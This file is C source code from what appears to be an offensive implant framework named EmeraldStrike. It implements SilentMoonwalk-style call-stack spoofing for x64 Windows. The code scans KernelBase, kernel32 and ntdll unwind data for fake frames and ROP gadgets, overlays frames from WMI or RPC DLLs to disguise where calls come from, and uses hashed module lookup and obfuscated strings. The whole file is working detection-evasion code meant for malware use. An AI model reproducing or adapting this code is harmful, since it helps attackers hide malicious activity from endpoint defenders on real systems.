/*
    EmeraldStrike - Desync/SilentMoonwalk Callstack Spoofing Implementation
    Based on SilentMoonwalk by KlezVirus / Waldo-IRC / Trickster0

    Scans KernelBase's .pdata (exception directory) for:
      1. A prolog frame (suitable stack frame for first fake frame)
      2. A POP RBP frame (for RBP-linked second fake frame)
      3. A JMP [RBX] gadget (for ROP chain → restore)
      4. An ADD RSP, XX; RET gadget (for ROP chain → stack pivot)

    Supports SPOOF_WMI / SPOOF_RPC / SPOOF_CUSTOM modes that additionally
    overlay frame sources from provider-specific DLLs.

    All state in INSTANCE struct. x64 only.
*/

#include "../include/config.h"
#include "../include/common.h"

#ifdef INCLUDE_EVASION_CALLSTACK_SPOOF
#ifdef _WIN64

#include "../include/evasion/callstack_spoof.h"
#include "../include/obfstr.h"
#include <stdarg.h>

// Module hash for KernelBase via PEB walk
#define H_MODULE_KERNELBASE  0xb280b755

// ============================================================================
// Simple PRNG (xorshift32) - state stored in INSTANCE, no globals
// ============================================================================

static UINT32 cs_rand(UINT32* pState) {
    if (*pState == 0) {
        UINT64 seed;
        seed = __rdtsc();
        *pState = (UINT32)(seed >> 4) ^ (UINT32)(seed >> 20);
        if (*pState == 0) *pState = 0x12345678;
    }
    *pState ^= *pState << 13;
    *pState ^= *pState >> 17;
    *pState ^= *pState << 5;
    return *pState;
}

// ============================================================================
// PE parsing - get .pdata (exception directory)
// ============================================================================

static PIMAGE_RUNTIME_FUNCTION_ENTRY cs_get_pdata(PVOID hModule, DWORD *pSize) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((UINT64)hModule + pDos->e_lfanew);

    DWORD rva  = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    *pSize     = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;

    if (rva == 0 || *pSize == 0)
        return NULL;

    return (PIMAGE_RUNTIME_FUNCTION_ENTRY)((UINT64)hModule + rva);
}

// ============================================================================
// Unwind code parsing - compute stack frame sizes
// ============================================================================

// Standard prolog frame size
static DWORD CS_GetFrameSize(PVOID moduleBase, PDS_UNWIND_INFO pInfo, DWORD *pStackSize) {
    PDS_UNWIND_CODE pCode  = (PDS_UNWIND_CODE)pInfo->UnwindCode;
    DWORD nodeIdx          = 0;
    DWORD countOfCodes     = pInfo->CountOfCodes;
    DWORD frameSize        = 0;
    BOOL  setFpregHit      = FALSE;

    *pStackSize = 0;

    while (nodeIdx < countOfCodes) {
        frameSize = 0;

        switch (pCode->UnwindOp) {
        case DS_UWOP_PUSH_NONVOL:
            if (pCode->OpInfo == DS_REG_RSP && !setFpregHit)
                return 0;
            *pStackSize += 8;
            break;

        case DS_UWOP_ALLOC_LARGE: {
            BYTE opInfoSaved = pCode->OpInfo;
            pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 1);
            nodeIdx++;
            frameSize = pCode->FrameOffset;
            if (opInfoSaved == 0) {
                frameSize *= 8;
            } else {
                pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 1);
                nodeIdx++;
                frameSize += pCode->FrameOffset << 16;
            }
            *pStackSize += frameSize;
            break;
        }

        case DS_UWOP_ALLOC_SMALL:
            *pStackSize += 8 * (pCode->OpInfo + 1);
            break;

        case DS_UWOP_SET_FPREG:
            if ((pInfo->Flags & 0x01) && (pInfo->Flags & DS_UNW_FLAG_CHAININFO))
                return 0;
            setFpregHit = TRUE;
            frameSize = -0x10 * (pInfo->FrameOffset);
            *pStackSize += frameSize;
            break;

        case DS_UWOP_SAVE_NONVOL:
            if (pCode->OpInfo == DS_REG_RBP || pCode->OpInfo == DS_REG_RSP)
                return 0;
            pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 1);
            nodeIdx++;
            break;

        case DS_UWOP_SAVE_NONVOL_BIG:
            if (pCode->OpInfo == DS_REG_RBP || pCode->OpInfo == DS_REG_RSP)
                return 0;
            pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 2);
            nodeIdx += 2;
            break;

        case DS_UWOP_EPILOG:
        case DS_UWOP_SAVE_XMM128:
            pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 1);
            nodeIdx++;
            break;

        case DS_UWOP_SPARE_CODE:
        case DS_UWOP_SAVE_XMM128BIG:
            pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 2);
            nodeIdx += 2;
            break;

        case DS_UWOP_PUSH_MACH_FRAME:
            *pStackSize += (pCode->OpInfo == 0) ? 0x40 : 0x48;
            break;
        }

        pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 1);
        nodeIdx++;
    }

    // Handle chained unwind info
    if (pInfo->Flags & DS_UNW_FLAG_CHAININFO) {
        DWORD idx = pInfo->CountOfCodes;
        if (idx & 1) idx++;
        PRUNTIME_FUNCTION pChain = (PRUNTIME_FUNCTION)(&pInfo->UnwindCode[idx]);
        return CS_GetFrameSize(moduleBase,
            (PDS_UNWIND_INFO)((UINT64)moduleBase + pChain->UnwindData), pStackSize);
    }

    return setFpregHit;
}

// Find frames where RBP is pushed/saved on stack
static DWORD CS_GetFrameSizeRbpPush(PVOID moduleBase, PDS_UNWIND_INFO pInfo, DWORD *pStackSize) {
    PDS_UNWIND_CODE pCode  = (PDS_UNWIND_CODE)pInfo->UnwindCode;
    DWORD nodeIdx          = 0;
    DWORD countOfCodes     = pInfo->CountOfCodes;
    DWORD frameSize        = 0;
    DWORD saveOffset       = 0;
    BOOL  rbpPushed        = FALSE;
    DWORD regOffsets[16]   = {0};

    *pStackSize = 0;

    while (nodeIdx < countOfCodes) {
        frameSize = 0;

        switch (pCode->UnwindOp) {
        case DS_UWOP_PUSH_NONVOL:
            if (pCode->OpInfo == DS_REG_RSP)
                return 0;
            if (pCode->OpInfo == DS_REG_RBP && rbpPushed)
                return 0;
            if (pCode->OpInfo == DS_REG_RBP) {
                saveOffset = *pStackSize;
                rbpPushed = TRUE;
            }
            *pStackSize += 8;
            break;

        case DS_UWOP_ALLOC_LARGE: {
            BYTE opInfoSaved = pCode->OpInfo;
            pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 1);
            nodeIdx++;
            frameSize = pCode->FrameOffset;
            if (opInfoSaved == 0) {
                frameSize *= 8;
            } else {
                pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 1);
                nodeIdx++;
                frameSize += pCode->FrameOffset << 16;
            }
            *pStackSize += frameSize;
            break;
        }

        case DS_UWOP_ALLOC_SMALL:
            *pStackSize += 8 * (pCode->OpInfo + 1);
            break;

        case DS_UWOP_SET_FPREG:
            return 0;

        case DS_UWOP_SAVE_NONVOL:
            if (pCode->OpInfo == DS_REG_RSP)
                return 0;
            {
                DWORD nextOffset = (DWORD)((PDS_UNWIND_CODE)((PWORD)pCode + 1))->FrameOffset * 8;
                regOffsets[pCode->OpInfo] = *pStackSize + nextOffset;
            }
            pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 1);
            nodeIdx++;

            if (pCode->OpInfo == DS_REG_RBP) {
                if (rbpPushed) return 0;
                rbpPushed = TRUE;
                saveOffset = regOffsets[DS_REG_RBP];
            }
            break;

        case DS_UWOP_SAVE_NONVOL_BIG:
            if (pCode->OpInfo == DS_REG_RSP)
                return 0;
            {
                DWORD bigOffset = (DWORD)((PDS_UNWIND_CODE)((PWORD)pCode + 1))->FrameOffset;
                bigOffset += (DWORD)((PDS_UNWIND_CODE)((PWORD)pCode + 2))->FrameOffset << 16;
                regOffsets[pCode->OpInfo] = *pStackSize + bigOffset;
            }
            if (pCode->OpInfo == DS_REG_RBP) {
                if (rbpPushed) return 0;
                rbpPushed = TRUE;
                saveOffset = regOffsets[DS_REG_RBP];
            }
            pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 2);
            nodeIdx += 2;
            break;

        case DS_UWOP_EPILOG:
        case DS_UWOP_SAVE_XMM128:
            pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 1);
            nodeIdx++;
            break;

        case DS_UWOP_SPARE_CODE:
        case DS_UWOP_SAVE_XMM128BIG:
            pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 2);
            nodeIdx += 2;
            break;

        case DS_UWOP_PUSH_MACH_FRAME:
            *pStackSize += (pCode->OpInfo == 0) ? 0x40 : 0x48;
            break;
        }

        pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 1);
        nodeIdx++;
    }

    if (pInfo->Flags & DS_UNW_FLAG_CHAININFO) {
        DWORD idx = pInfo->CountOfCodes;
        if (idx & 1) idx++;
        PRUNTIME_FUNCTION pChain = (PRUNTIME_FUNCTION)(&pInfo->UnwindCode[idx]);
        return CS_GetFrameSize(moduleBase,
            (PDS_UNWIND_INFO)((UINT64)moduleBase + pChain->UnwindData), pStackSize);
    }

    return saveOffset;
}

// Simple frame size - ignores SET_FPREG (for gadget hosting functions)
static DWORD CS_GetFrameSizeSimple(PVOID moduleBase, PDS_UNWIND_INFO pInfo, DWORD *pStackSize) {
    PDS_UNWIND_CODE pCode  = (PDS_UNWIND_CODE)pInfo->UnwindCode;
    DWORD nodeIdx          = 0;
    DWORD countOfCodes     = pInfo->CountOfCodes;
    DWORD frameSize        = 0;

    *pStackSize = 0;

    while (nodeIdx < countOfCodes) {
        frameSize = 0;

        switch (pCode->UnwindOp) {
        case DS_UWOP_PUSH_NONVOL:
            if (pCode->OpInfo == DS_REG_RSP)
                return 0;
            *pStackSize += 8;
            break;

        case DS_UWOP_ALLOC_LARGE: {
            BYTE opInfoSaved = pCode->OpInfo;
            pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 1);
            nodeIdx++;
            frameSize = pCode->FrameOffset;
            if (opInfoSaved == 0) {
                frameSize *= 8;
            } else {
                pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 1);
                nodeIdx++;
                frameSize += pCode->FrameOffset << 16;
            }
            *pStackSize += frameSize;
            break;
        }

        case DS_UWOP_ALLOC_SMALL:
            *pStackSize += 8 * (pCode->OpInfo + 1);
            break;

        case DS_UWOP_SET_FPREG:
            break;

        case DS_UWOP_SAVE_NONVOL:
            if (pCode->OpInfo == DS_REG_RSP)
                return 0;
            pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 1);
            nodeIdx++;
            break;

        case DS_UWOP_SAVE_NONVOL_BIG:
            if (pCode->OpInfo == DS_REG_RSP)
                return 0;
            pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 2);
            nodeIdx += 2;
            break;

        case DS_UWOP_EPILOG:
        case DS_UWOP_SAVE_XMM128:
            pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 1);
            nodeIdx++;
            break;

        case DS_UWOP_SPARE_CODE:
        case DS_UWOP_SAVE_XMM128BIG:
            pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 2);
            nodeIdx += 2;
            break;

        case DS_UWOP_PUSH_MACH_FRAME:
            *pStackSize += (pCode->OpInfo == 0) ? 0x40 : 0x48;
            break;
        }

        pCode = (PDS_UNWIND_CODE)((PWORD)pCode + 1);
        nodeIdx++;
    }

    if (pInfo->Flags & DS_UNW_FLAG_CHAININFO) {
        DWORD idx = pInfo->CountOfCodes;
        if (idx & 1) idx++;
        PRUNTIME_FUNCTION pChain = (PRUNTIME_FUNCTION)(&pInfo->UnwindCode[idx]);
        return CS_GetFrameSizeSimple(moduleBase,
            (PDS_UNWIND_INFO)((UINT64)moduleBase + pChain->UnwindData), pStackSize);
    }

    return *pStackSize;
}

// ============================================================================
// Frame & Gadget Discovery
// ============================================================================

static BOOL CS_FindFirstFrame(PVOID moduleBase, PIMAGE_RUNTIME_FUNCTION_ENTRY pRT,
                              DWORD rtCount, PDESYNC_SPOOFER pSpoofer) {
    DWORD stackSize = 0;

    for (DWORD i = 0; i < rtCount; i++) {
        PDS_UNWIND_INFO pInfo = (PDS_UNWIND_INFO)((UINT64)moduleBase + pRT[i].UnwindData);
        DWORD status = CS_GetFrameSize(moduleBase, pInfo, &stackSize);

        if (status != 0 && stackSize > 0) {
            pSpoofer->FirstFrameFunctionPointer =
                (PVOID)((UINT64)moduleBase + pRT[i].BeginAddress);
            pSpoofer->FirstFrameSize = (UINT64)stackSize;
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL CS_FindSecondFrame(PVOID moduleBase, PIMAGE_RUNTIME_FUNCTION_ENTRY pRT,
                               DWORD rtCount, PDESYNC_SPOOFER pSpoofer) {
    DWORD stackSize = 0;
    DWORD skipped = 0;

    for (DWORD i = 0; i < rtCount; i++) {
        PDS_UNWIND_INFO pInfo = (PDS_UNWIND_INFO)((UINT64)moduleBase + pRT[i].UnwindData);
        DWORD rbpOffset = CS_GetFrameSizeRbpPush(moduleBase, pInfo, &stackSize);

        if (rbpOffset != 0 && stackSize > 0) {
            skipped++;
            if (skipped <= 1)
                continue;

            pSpoofer->SecondFrameFunctionPointer =
                (PVOID)((UINT64)moduleBase + pRT[i].BeginAddress);
            pSpoofer->SecondFrameSize = (UINT64)stackSize;
            pSpoofer->StackOffsetWhereRbpIsPushed = (UINT64)rbpOffset;
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL CS_FindJmpRbxGadget(PVOID moduleBase, PIMAGE_RUNTIME_FUNCTION_ENTRY pRT,
                                DWORD rtCount, PDESYNC_SPOOFER pSpoofer) {
    DWORD stackSize = 0;

    for (DWORD i = 0; i < rtCount; i++) {
        UINT64 funcStart = (UINT64)moduleBase + pRT[i].BeginAddress;
        UINT64 funcEnd   = (UINT64)moduleBase + pRT[i].EndAddress;

        for (UINT64 j = funcStart; j < funcEnd - 1; j++) {
            if (*(WORD*)j == DS_JMP_RBX) {
                stackSize = 0;
                PDS_UNWIND_INFO pInfo = (PDS_UNWIND_INFO)((UINT64)moduleBase + pRT[i].UnwindData);
                DWORD status = CS_GetFrameSizeSimple(moduleBase, pInfo, &stackSize);

                if (status != 0) {
                    pSpoofer->JmpRbxGadget = (PVOID)j;
                    pSpoofer->JmpRbxGadgetFrameSize = (UINT64)stackSize;
                    return TRUE;
                }
                break;
            }
        }
    }
    return FALSE;
}

static BOOL CS_FindAddRspGadget(PVOID moduleBase, PIMAGE_RUNTIME_FUNCTION_ENTRY pRT,
                                DWORD rtCount, PDESYNC_SPOOFER pSpoofer) {
    DWORD stackSize = 0;
    BOOL  found     = FALSE;
    UINT64 bestImm  = 0;

    for (DWORD i = 0; i < rtCount; i++) {
        UINT64 funcStart = (UINT64)moduleBase + pRT[i].BeginAddress;
        UINT64 funcEnd   = (UINT64)moduleBase + pRT[i].EndAddress;

        for (UINT64 j = funcStart; j < funcEnd - 4; j++) {
            if (*(BYTE*)j != 0x48 || *(BYTE*)(j + 2) != 0xC4)
                continue;

            UINT64 gadgetImm = 0;
            BYTE   opByte    = *(BYTE*)(j + 1);

            if (opByte == 0x83) {
                gadgetImm = (UINT64)*(BYTE*)(j + 3);
                if (gadgetImm < DS_MIN_ADD_RSP_IMM)
                    continue;
                if (*(BYTE*)(j + 4) != DS_RET_BYTE)
                    continue;
            } else if (opByte == 0x81 && (j + 7) < funcEnd) {
                gadgetImm = (UINT64)*(DWORD*)(j + 3);
                if (gadgetImm < DS_MIN_ADD_RSP_IMM || gadgetImm > 0x1000)
                    continue;
                if (*(BYTE*)(j + 7) != DS_RET_BYTE)
                    continue;
            } else {
                continue;
            }

            if (gadgetImm <= bestImm)
                continue;

            stackSize = 0;
            PDS_UNWIND_INFO pInfo = (PDS_UNWIND_INFO)((UINT64)moduleBase + pRT[i].UnwindData);
            DWORD status = CS_GetFrameSizeSimple(moduleBase, pInfo, &stackSize);

            if (status != 0) {
                pSpoofer->AddRspXGadget = (PVOID)j;
                pSpoofer->AddRspXGadgetFrameSize = (UINT64)stackSize;
                pSpoofer->AddRspImmediate = gadgetImm;
                bestImm = gadgetImm;
                found   = TRUE;

                if (gadgetImm >= DS_PREFERRED_ADD_RSP_IMM)
                    return TRUE;
            }
        }
    }
    return found;
}

// ============================================================================
// Module-level frame overlay: re-scan a DLL's .pdata for frames to use
// as the "first" and "second" frames - makes the spoofed stack look like
// the call originated from that DLL's code.
// ============================================================================

static BOOL CS_OverlayFramesFromModule(PVOID hModule, PDESYNC_SPOOFER pSpoofer) {
    if (!hModule) return FALSE;

    DWORD pdataSize = 0;
    PIMAGE_RUNTIME_FUNCTION_ENTRY pRT = cs_get_pdata(hModule, &pdataSize);
    if (!pRT || pdataSize == 0) return FALSE;
    DWORD rtCount = pdataSize / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);

    // Try to find better frames from this module
    DESYNC_SPOOFER temp;
    es_memset(&temp, 0, sizeof(temp));

    if (CS_FindFirstFrame(hModule, pRT, rtCount, &temp)) {
        pSpoofer->FirstFrameFunctionPointer = temp.FirstFrameFunctionPointer;
        pSpoofer->FirstFrameSize = temp.FirstFrameSize;
    }

    if (CS_FindSecondFrame(hModule, pRT, rtCount, &temp)) {
        pSpoofer->SecondFrameFunctionPointer = temp.SecondFrameFunctionPointer;
        pSpoofer->SecondFrameSize = temp.SecondFrameSize;
        pSpoofer->StackOffsetWhereRbpIsPushed = temp.StackOffsetWhereRbpIsPushed;
    }

    return TRUE;
}

// ============================================================================
// Public API
// ============================================================================

BOOL callstack_spoof_init(struct _INSTANCE* inst) {
    PDESYNC_SPOOFER pSpoofer = &inst->DesyncSpoofer;
    es_memset(pSpoofer, 0, sizeof(DESYNC_SPOOFER));
    inst->dwDesyncRngState = 0;

    // Get KernelBase via PEB walk
    PVOID hKernelBase = resolve_module_peb(H_MODULE_KERNELBASE);
    if (!hKernelBase) {
        DBG(inst, "[ES] Callstack spoof: failed to get KernelBase");
        return FALSE;
    }
    pSpoofer->KernelBaseAddress = hKernelBase;

    // Get KernelBase .pdata for frame/gadget discovery
    DWORD pdataSize = 0;
    PIMAGE_RUNTIME_FUNCTION_ENTRY pRT = cs_get_pdata(hKernelBase, &pdataSize);
    if (!pRT || pdataSize == 0) {
        DBG(inst, "[ES] Callstack spoof: failed to get .pdata");
        return FALSE;
    }
    DWORD rtCount = pdataSize / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);

    // Frames always start from KernelBase (natural appearance)
    if (!CS_FindFirstFrame(hKernelBase, pRT, rtCount, pSpoofer)) {
        DBG(inst, "[ES] Callstack spoof: no prolog frame found");
        return FALSE;
    }

    if (!CS_FindSecondFrame(hKernelBase, pRT, rtCount, pSpoofer)) {
        DBG(inst, "[ES] Callstack spoof: no RBP push frame found");
        return FALSE;
    }

    // Gadgets: try KernelBase first, then kernel32, then ntdll
    BOOL jmpFound = CS_FindJmpRbxGadget(hKernelBase, pRT, rtCount, pSpoofer);
    BOOL addFound = CS_FindAddRspGadget(hKernelBase, pRT, rtCount, pSpoofer);

    // Fallback modules for missing gadgets
    if (!jmpFound || !addFound) {
        PVOID fallbacks[] = {
            inst->Modules.Kernel32,
            inst->Modules.Ntdll,
        };
        for (int m = 0; m < 2 && (!jmpFound || !addFound); m++) {
            if (!fallbacks[m]) continue;
            DWORD fbSize = 0;
            PIMAGE_RUNTIME_FUNCTION_ENTRY fbRT = cs_get_pdata(fallbacks[m], &fbSize);
            if (!fbRT || fbSize == 0) continue;
            DWORD fbCount = fbSize / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);

            if (!jmpFound)
                jmpFound = CS_FindJmpRbxGadget(fallbacks[m], fbRT, fbCount, pSpoofer);
            if (!addFound)
                addFound = CS_FindAddRspGadget(fallbacks[m], fbRT, fbCount, pSpoofer);
        }
    }

    if (!jmpFound) {
        DBG(inst, "[ES] Callstack spoof: no JMP [RBX] gadget");
        return FALSE;
    }

    if (!addFound) {
        DBG(inst, "[ES] Callstack spoof: no ADD RSP,XX gadget");
        return FALSE;
    }

    // ── Spoof mode overlay: load provider-specific DLLs and overlay frames ──
#if CALLSTACK_SPOOF_MODE == SPOOF_WMI
    {
        // Load WMI provider chain DLLs
        xstr(_wbemcomn, "wbemcomn.dll");
        xstr(_fastprox, "fastprox.dll");

        PVOID hWbemcomn = (PVOID)inst->Win32.LoadLibraryA(_wbemcomn);
        PVOID hFastprox = (PVOID)inst->Win32.LoadLibraryA(_fastprox);

        // Try fastprox first (WMI provider host), fall back to wbemcomn
        if (hFastprox) {
            CS_OverlayFramesFromModule(hFastprox, pSpoofer);
        } else if (hWbemcomn) {
            CS_OverlayFramesFromModule(hWbemcomn, pSpoofer);
        }
        // If neither loaded, we keep KernelBase frames (still valid)
    }
#elif CALLSTACK_SPOOF_MODE == SPOOF_RPC
    {
        // Load RPC dispatch chain DLL
        xstr(_rpcrt4, "rpcrt4.dll");
        PVOID hRpcrt4 = (PVOID)inst->Win32.LoadLibraryA(_rpcrt4);
        if (hRpcrt4) {
            CS_OverlayFramesFromModule(hRpcrt4, pSpoofer);
        }
    }
#elif CALLSTACK_SPOOF_MODE == SPOOF_CUSTOM
    {
        // CALLSTACK_SPOOF_CUSTOM_MODULE is stamped by builder.py as an xstr-friendly literal
#ifdef CALLSTACK_SPOOF_CUSTOM_MODULE
        xstr(_custom_mod, CALLSTACK_SPOOF_CUSTOM_MODULE);
        PVOID hCustom = (PVOID)inst->Win32.LoadLibraryA(_custom_mod);
        if (hCustom) {
            CS_OverlayFramesFromModule(hCustom, pSpoofer);
        }
#endif
    }
#endif

    // Set initial random offsets
    pSpoofer->FirstFrameRandomOffset  = (UINT64)(cs_rand(&inst->dwDesyncRngState) & 0xFF);
    pSpoofer->SecondFrameRandomOffset = (UINT64)(cs_rand(&inst->dwDesyncRngState) & 0xFF);

    inst->bCallstackSpoofInit = TRUE;
    DBG(inst, "[ES] Callstack spoof initialized");
    return TRUE;
}

void callstack_spoof_refresh(PDESYNC_SPOOFER pSpoofer, UINT32* pRngState) {
    pSpoofer->FirstFrameRandomOffset  = (UINT64)(cs_rand(pRngState) & 0xFF);
    pSpoofer->SecondFrameRandomOffset = (UINT64)(cs_rand(pRngState) & 0xFF);
}

// ============================================================================
// Spoofed dispatch: varargs → struct → desync_spoof_call
// ============================================================================

PVOID callstack_spoofed_call(struct _INSTANCE* inst, PVOID pTarget, DWORD nArgs, ...) {
    PDESYNC_SPOOFER pSpoofer = &inst->DesyncSpoofer;

    if (!inst->bCallstackSpoofInit) {
        // Not initialized - fall back to direct call
        va_list va;
        va_start(va, nArgs);
        UINT64 a[11] = {0};
        for (DWORD i = 0; i < nArgs && i < 11; i++) a[i] = va_arg(va, UINT64);
        va_end(va);
        typedef PVOID (*FN11)(UINT64,UINT64,UINT64,UINT64,UINT64,UINT64,
                              UINT64,UINT64,UINT64,UINT64,UINT64);
        return ((FN11)pTarget)(a[0],a[1],a[2],a[3],a[4],a[5],
                               a[6],a[7],a[8],a[9],a[10]);
    }

    // Check arg count against gadget capacity
    UINT32 maxArgs = spoof_max_args(pSpoofer->AddRspImmediate);
    if (nArgs > maxArgs) {
        va_list va;
        va_start(va, nArgs);
        UINT64 a[11] = {0};
        for (DWORD i = 0; i < nArgs && i < 11; i++) a[i] = va_arg(va, UINT64);
        va_end(va);
        typedef PVOID (*FN11)(UINT64,UINT64,UINT64,UINT64,UINT64,UINT64,
                              UINT64,UINT64,UINT64,UINT64,UINT64);
        return ((FN11)pTarget)(a[0],a[1],a[2],a[3],a[4],a[5],
                               a[6],a[7],a[8],a[9],a[10]);
    }

    callstack_spoof_refresh(pSpoofer, &inst->dwDesyncRngState);

    pSpoofer->SpoofFunctionPointer = pTarget;
    pSpoofer->Nargs = nArgs;

    va_list va;
    va_start(va, nArgs);
    pSpoofer->Arg01 = (nArgs > 0)  ? (PVOID)va_arg(va, UINT64) : NULL;
    pSpoofer->Arg02 = (nArgs > 1)  ? (PVOID)va_arg(va, UINT64) : NULL;
    pSpoofer->Arg03 = (nArgs > 2)  ? (PVOID)va_arg(va, UINT64) : NULL;
    pSpoofer->Arg04 = (nArgs > 3)  ? (PVOID)va_arg(va, UINT64) : NULL;
    pSpoofer->Arg05 = (nArgs > 4)  ? (PVOID)va_arg(va, UINT64) : NULL;
    pSpoofer->Arg06 = (nArgs > 5)  ? (PVOID)va_arg(va, UINT64) : NULL;
    pSpoofer->Arg07 = (nArgs > 6)  ? (PVOID)va_arg(va, UINT64) : NULL;
    pSpoofer->Arg08 = (nArgs > 7)  ? (PVOID)va_arg(va, UINT64) : NULL;
    pSpoofer->Arg09 = (nArgs > 8)  ? (PVOID)va_arg(va, UINT64) : NULL;
    pSpoofer->Arg10 = (nArgs > 9)  ? (PVOID)va_arg(va, UINT64) : NULL;
    pSpoofer->Arg11 = (nArgs > 10) ? (PVOID)va_arg(va, UINT64) : NULL;
    va_end(va);

    return desync_spoof_call(pSpoofer);
}

#endif // _WIN64
#endif // INCLUDE_EVASION_CALLSTACK_SPOOF
